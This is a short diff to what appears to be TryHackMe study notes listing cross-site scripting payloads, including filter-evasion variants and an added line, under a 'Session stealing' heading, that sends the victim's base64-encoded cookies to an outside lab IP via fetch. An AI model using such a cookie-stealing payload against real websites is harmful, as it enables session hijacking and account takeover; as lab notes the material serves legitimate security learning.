@@ -106,6 +106,7 @@ sublist3r.py -d <DOMAIN>
 ';alert('THM');//
 <sscriptcript>alert('THM');</sscriptcript>
 /images/cat.jpg" onload="alert('THM');
+<script>fetch('http://10.8.187.74:9000?cookie=' + btoa(document.cookie) );</script>
 ````
 - Session stealing
 ````
